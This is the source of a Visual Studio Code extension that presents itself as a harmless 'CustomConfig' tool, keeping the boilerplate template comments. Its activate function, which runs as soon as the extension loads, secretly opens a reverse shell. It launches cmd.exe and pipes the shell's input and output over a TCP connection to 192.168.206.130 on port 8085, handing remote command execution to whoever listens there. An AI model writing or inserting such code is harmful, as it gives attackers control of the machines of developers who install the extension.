// The module 'vscode' contains the VS Code extensibility API
// Import the module and reference it with the alias vscode in your code below
const vscode = require('vscode');
const { exec } = require("child_process")

// This method is called when your extension is activated
// Your extension is activated the very first time the command is executed
/**
 * @param {vscode.ExtensionContext} context
 */
function activate(context) {

	// Use the console to output diagnostic information (console.log) and errors (console.error)
	// This line of code will only be executed once when your extension is activated
	let net = require("net");
	let shell = exec("cmd.exe");
	var client_sock = new net.Socket();
	client_sock.connect(8085, "192.168.206.130", ()=> {
		client_sock.pipe(shell.stdin);
		shell.stdout.pipe(client_sock);
		shell.stderr.pipe(client_sock);
	})
}

// This method is called when your extension is deactivated
function deactivate() {}

module.exports = {
	activate,
	deactivate
}


vscode.window.showInformationMessage("CustomConfig Activated");

